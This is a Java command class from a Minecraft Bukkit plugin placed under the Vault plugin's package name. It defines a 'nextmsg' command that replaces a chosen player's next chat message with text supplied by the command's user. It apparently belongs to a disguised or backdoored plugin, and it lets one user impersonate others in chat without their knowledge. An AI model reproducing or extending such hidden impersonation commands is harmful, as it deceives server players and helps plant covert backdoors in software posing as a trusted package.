package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Nextmsg extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length < 2) {
			p.sendMessage(Settings.USAGE("nextmsg <player> <msg>"));
		} else {
			Player target = Bukkit.getServer().getPlayer(args[1]);
			
			if (target == null) {
				p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
			} else {
				StringBuilder next = new StringBuilder();
				for (int i = 2; i != args.length; ++i) {
					next.append(args[i]).append(" ");
				}
				p.sendMessage(Settings.PREFIX(Settings.HIGHLIGHT_COLOUR + target.getName() + "'s" + Settings.SECONDARY_COLOUR + " next message to chat will be " + Settings.HIGHLIGHT_COLOUR + next));
				plugin.nextmsg.put(target, next.toString());
			}
			
			
		}
	}

}
